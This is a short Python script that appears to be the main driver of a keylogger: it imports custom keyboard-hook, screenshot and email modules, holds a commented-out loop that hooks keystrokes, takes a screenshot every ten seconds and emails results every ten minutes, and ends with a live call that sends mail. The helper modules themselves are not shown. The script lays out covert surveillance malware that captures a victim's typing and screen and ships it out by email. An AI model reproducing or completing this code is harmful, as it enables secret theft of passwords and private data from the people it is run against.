import Hook_Keyboard
import PrintScreen
import schedule
import Email_Connection

# schedule.every(10).seconds.do(PrintScreen.take_screen)
# schedule.every(10).minutes.do(Email_Connection.sendmail())
# while True:
#     Hook_Keyboard.hook_keyboard()
#     schedule.run_pending()

Email_Connection.sendmail()

